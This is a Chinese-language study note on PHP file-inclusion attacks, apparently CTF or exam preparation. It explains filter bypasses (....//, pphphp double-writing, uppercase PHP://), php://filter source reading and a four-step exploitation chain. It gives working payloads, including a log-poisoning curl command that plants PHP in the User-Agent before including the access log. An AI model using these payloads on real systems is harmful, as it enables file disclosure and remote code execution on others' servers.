## 二、知识点

### 1. 两种「点」的过滤不是一回事

```php
str_replace('../', '', $f)   // 删「点+点+斜杠」→ 用 ....// 绕
str_replace('..',  '', $f)   // 删所有「点+点」→ ....// 自身含 .. 也被删
```

前者删完中间的 `../`，剩下的字符又拼成 `../`；后者把 `....//` 里的 `..` 一起删掉，所以只能走**绝对路径** `/etc/passwd`。

### 2. 双写绕过（实测）

过滤把 `php` 三个字符删掉时，payload 要用双写：

| 过滤方式 | `php://filter` | `pphphp://filter` | `phpphp://filter` |
|---|---|---|---|
| `str_replace` 单次 | 失效 | 可用 | 失效 |
| `str_ireplace` 单次不分大小写 | 失效 | 可用 | 失效 |
| 循环删到干净 | 失效 | 失效 | 失效 |

**为什么 `pphphp` 行、`phpphp` 不行**：`str_replace` 在**原串**上从左往右找非重叠匹配。

```
pphphp   p p h p h p   → 只有中间三个被删 → 剩下 p + h p = "php"   可用
phpphp   p h p p h p   → 两段都被扫到     → 删干净 = ""            失效
```

**原理通用**：凡是「单次字符串替换」的过滤，先想「删完之后能不能重新拼回原串」。`....//`、`pphphp`、`seleselectct` 都是同一个套路。

### 3. wrapper 名不区分大小写

过滤 `php://` 时，换成 `PHP://filter` 或 `Php://filter` 就能过。

### 4. 后缀检查被 filter 绕过

```php
if (substr($f, -4) !== '.php') { die('no'); }
```

检查的是「结尾必须是 `.php`」，而 payload 本身就以 `.php` 结尾：

```
php://filter/convert.base64-encode/resource=index.php
                                              ↑ 通过检查
```

检查形同虚设——它只看了字符串结尾，没看这个字符串会被怎么用。

### 5. open_basedir 的现象

不是空白，而是明确报错：

```
open_basedir restriction in effect. File(...) is not within the allowed path(s)
```

确认方法：看报错里有没有 `open_basedir` 字样，或 `phpinfo()` 里搜这个配置。

### 6. 日志包含的转义问题

Apache 会把日志里的 `<`、`>`、`"` 转义成 `\x3C` 这类形式，代码写进 UA 后失效；Nginx 原样记录，所以日志包含在 Nginx 上更容易成功。

### 7. 利用链四步

```
① 探：能不能包含？包含后是回显、空白还是报错
② 筛：有哪些写入口——php://input / data:// / 日志 / session / 上传点
③ 落：把代码写进那个入口
④ 包：include 它，执行，拿 flag
```

**卡壳的原因**：直接跳到第 ③ 步写 payload，跳过了第 ② 步的筛选。

选路表：

| 条件 | 可行的路 |
|---|---|
| `allow_url_include = On` | `php://input`、`data://` |
| 有日志文件可读 | 日志包含 |
| session 内容可控 | session 包含 |
| 有上传点 | 图片马 + 包含 |
| `php://filter` 可用 | 读源码，找别的洞 |

## 三、案例 / 命令

### 1. 验证双写是否成立

```php
$f = function($s){ return str_replace("php", "", $s); };
echo $f("pphphp://filter/read=convert.base64-encode/resource=index.php");
// 输出：php://filter/read=convert.base64-encode/resource=index.php
```

### 2. 三种 payload 的适用条件

```
正常        php://filter/convert.base64-encode/resource=index.php
后缀追加    php://filter/convert.base64-encode/resource=index
后缀检查    php://filter/convert.base64-encode/resource=index.php
协议过滤    PHP://filter/convert.base64-encode/resource=index.php
字符过滤    pphphp://filter/convert.base64-encode/resource=index.php
```

### 3. 日志包含

```
① 定路径  Nginx : /var/log/nginx/access.log
          Apache: /var/log/apache2/access.log
② 写马    curl -A '<?=`id`;?>' http://target/
③ 包含    ?page=/var/log/nginx/access.log
```

## 四、踩坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 把 `..` 过滤和 `../` 过滤混为一谈 | `....//` 绕不过 | 前者只能靠绝对路径 |
| 双写位置搞反 | `phpphp` 无效 | 两个 `php` 都被扫到；要写成 `pphphp` |
| 知道零件但不会拼链 | 三道链题全空 | 缺「先筛条件再选路」，直接写 payload 就卡住 |
| 利用链 30 分空白 | 13 题里后 3 题没答 | 这块最容易出综合题，只背单点不够 |
| 循环删净时双写失效 | 过滤写得更严 | 换 `data://`、`phar://` 或日志包含 |
